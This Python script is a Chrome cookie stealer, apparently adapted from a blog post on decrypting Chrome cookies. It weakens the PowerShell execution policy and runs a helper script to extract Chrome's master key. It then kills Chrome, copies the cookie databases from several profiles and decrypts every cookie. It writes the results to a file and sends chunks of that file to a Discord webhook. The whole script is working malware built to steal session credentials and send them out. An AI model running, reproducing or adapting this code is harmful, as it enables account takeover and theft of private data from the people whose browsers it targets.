#This is largely based on KRPTYK
#https://krptyk.com/2023/10/28/decrypting-chrome-cookies/
import os
import sqlite3
import shutil
from Crypto.Cipher import AES
import argparse
from datetime import datetime, timedelta
import subprocess
import sys
import getpass
import psutil
import requests
import json
import discord_webhook
webhook = ""
current_directory = os.getcwd()
# Command to open PowerShell as admin
powershell_command = "Start-Process powershell -Verb runAs -ArgumentList '-Command', 'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force'"

# Execute the command
subprocess.run(["powershell", "-Command", powershell_command])

getmasterkey = current_directory + "\GetMasterKey.ps1"
outputfile = current_directory + "\Master.txt"

username = getpass.getuser()

powshscript = "powershell -ExecutionPolicy Bypass -File "+ getmasterkey + """ -InputFilePath "C:\\Users\\"""+username+"""\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" -OutputFilePath """ + outputfile
p = subprocess.Popen(["powershell.exe",powshscript], stdout=sys.stdout, stdin=subprocess.PIPE)


p.stdin.write(b"R\n")
p.stdin.flush()
p.communicate()

chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

# PowerShell script to execute chrome.exe command

appdata_path = os.environ['LOCALAPPDATA']
print(appdata_path)
# Construct the paths to the Chrome Cookies files
cookies_path1 = os.path.join(appdata_path, "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
cookies_path2 = os.path.join(appdata_path, "Google", "Chrome", "User Data", "Profile 1", "Network", "Cookies")
cookies_path3 = os.path.join(appdata_path, "Google", "Chrome", "User Data", "Profile 2", "Network", "Cookies")
cookies_path1 = os.path.abspath(cookies_path1)
cookies_path2 = os.path.abspath(cookies_path2)
cookies_path3 = os.path.abspath(cookies_path3)
print(cookies_path1)
def chrome_time_conversion(chromedate):
    try:
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    except:
        return chromedate

def decrypt_value(buff, master_key):
    try:
        iv, payload = buff[3:15], buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return "No decrypt"


def find_and_kill_chrome():
    for process in psutil.process_iter(['pid', 'name']):
        if 'chrome' in process.info['name'].lower():
            print(f"Found Chrome process with PID: {process.pid}")
            try:
                process.kill()
                print("Process killed successfully.")
            except psutil.AccessDenied:
                print("Access denied. Could not kill the process.")
            except Exception as e:
                print(f"Error occurred: {e}")
if __name__ == '__main__':
    
    find_and_kill_chrome()
    master_path = outputfile
    with open(master_path, 'rb') as f:
        master_key = f.read()
 
    temp_db = "CookiesTemp.db"
    found = False
    from shutil import copy2

    for cookies_path in [cookies_path1, cookies_path2, cookies_path3]:
        try:
                # Check if the directory is accessible (including hidden directories)
            if os.access(cookies_path, os.R_OK):
                print("Directory exists and is accessible.")
                copy2(cookies_path, temp_db)
                found = True
                break
            else:
                print(cookies_path+"Directory exists but is not accessible.")
            

        except FileNotFoundError:
            print(cookies_path, "- Error, not found")

    if not found:
        print("Error: Could not find any matching profiles")
        input("Press Enter to exit...")  # Wait for user input before exiting
        quit()
    else:
        grouped_data = {}
        
        with sqlite3.connect(temp_db) as conn:
            cursor = conn.cursor()
            for row in cursor.execute("SELECT host_key, name, encrypted_value, creation_utc, last_access_utc, expires_utc FROM cookies"):
                host_key = row[0]
                data = {
                    'name': row[1],
                    'decrypted_value': decrypt_value(row[2], master_key),
                    'creation_utc': chrome_time_conversion(row[3]),
                    'last_access_utc': chrome_time_conversion(row[4]),
                    'expires_utc': chrome_time_conversion(row[5])
                }
                
                if host_key not in grouped_data:
                    grouped_data[host_key] = []
                grouped_data[host_key].append(data)
        
        output_file_path = "output.txt"  # Path to the output file
        output_file_path = current_directory +"/"+output_file_path
        with open(output_file_path, "w") as f:
            for host, cookies in grouped_data.items():
                f.write("=" * 70 + "\n")
                f.write(f"Host: {host}\n")
                for cookie in cookies:
                    f.write("\n")
                    for key, val in cookie.items():
                        f.write(f"{key.title().replace('_', ' ')}: {val}\n")
                f.write("=" * 70 + "\n\n")
        with open(output_file_path, "r") as f:
            lines = f.readlines()
            last_10 = lines[-10:]

        data_from_file = ''.join(last_10)
        chunk_size = 1000
    
        def chunk_text(text, chink_size):
            return [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
        chunks = chunk_text(data_from_file,chunk_size)
        for chunk in chunks:
            sending = discord_webhook.DiscordWebhook(url=webhook, content=chunk)
            response = sending.execute()
        #print(response)
        os.remove(temp_db)